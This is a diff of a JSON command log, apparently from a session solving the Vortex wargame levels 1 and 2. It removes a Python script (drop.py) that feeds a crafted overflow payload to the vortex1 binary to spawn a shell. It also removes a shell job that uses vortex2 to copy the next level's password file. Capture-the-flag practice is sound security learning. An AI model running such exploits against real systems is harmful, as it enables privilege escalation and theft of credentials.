@@ -993,31 +993,6 @@
      ]
     },
     {
-     "cmd": "cat -n drop.py",
-     "out": [
-      "     1\timport os, select, subprocess, sys, time",
-      "     2\tpayload = bytes([92]) * 261 + bytes([0xca]) * 4 + b\"\\n\"",
-      "     3\tp = subprocess.Popen([\"/vortex/vortex1\"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)",
-      "     4\ttime.sleep(0.2); p.stdin.write(payload); p.stdin.flush(); time.sleep(0.5)",
-      "     5\tp.stdin.write(b\"  sh\\n\"); p.stdin.flush(); time.sleep(0.6)",
-      "     6\tp.stdin.write(open(sys.argv[1], \"rb\").read() + b\"\\nexit\\n\"); p.stdin.flush()",
-      "     7\tend = time.time() + 6",
-      "     8\tout = b\"\"",
-      "     9\twhile time.time() < end:",
-      "    10\t    r, _, _ = select.select([p.stdout], [], [], 0.2)",
-      "    11\t    if r:",
-      "    12\t        chunk = os.read(p.stdout.fileno(), 4096)",
-      "    13\t        if not chunk:",
-      "    14\t            break",
-      "    15\t        out += chunk",
-      "    16\ttry:",
-      "    17\t    p.kill()",
-      "    18\texcept Exception:",
-      "    19\t    pass",
-      "    20\tprint(out.decode(errors=\"replace\"), end=\"\")"
-     ]
-    },
-    {
      "cmd": "send /tmp/drop.py (the file typed above, delivered as base64) and chmod 755",
      "out": [
       "-rwxr-xr-x 1 vortex1 vortex1 741 Nov  6 05:59 /tmp/drop.py"
@@ -1129,15 +1104,6 @@
       "~",
       "job.sh [+]                                                                        5,1            All",
       "                                                                                         ^["
-     ]
-    },
-    {
-     "cmd": "cat -n job.sh",
-     "out": [
-      "     1\tB=$(mktemp -d /tmp/vxl2.XXXXXX) && cd \"$B\"",
-      "     2\t/vortex/vortex2 /etc/vortex_pass/vortex3",
-      "     3\tcp '/tmp/ownership.$$.tar' own.tar",
-      "     4\tprintf '%s' \"$B\" > /tmp/vx2d/lastdir"
      ]
     },
     {
